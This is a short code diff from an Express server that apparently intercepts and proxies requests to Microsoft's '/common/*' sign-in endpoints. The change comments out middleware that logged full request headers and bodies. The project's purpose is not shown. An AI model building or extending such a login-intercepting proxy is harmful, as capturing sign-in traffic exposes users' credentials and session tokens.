@@ -27,17 +27,17 @@ app.get("/", (req, res) => {
 
 // Intercept and proxy requests to Microsoft
 // Log incoming requests for debugging
-app.use((req, res, next) => {
-  const modifiedBody = req.body && Object.keys(req.body).length > 0 ? req.body : { action: "default" };
+// app.use((req, res, next) => {
+//   const modifiedBody = req.body && Object.keys(req.body).length > 0 ? req.body : { action: "default" };
 
-  console.log("Incoming Request:", {
-    method: req.method,
-    path: req.path,
-    headers: req.headers,
-    body: modifiedBody,
-  });
-  next();
-});
+//   console.log("Incoming Request:", {
+//     method: req.method,
+//     path: req.path,
+//     headers: req.headers,
+//     body: modifiedBody,
+//   });
+//   next();
+// });
 
 // Proxy requests to Microsoft's endpoints
 app.use("/common/*", async (req, res) => {
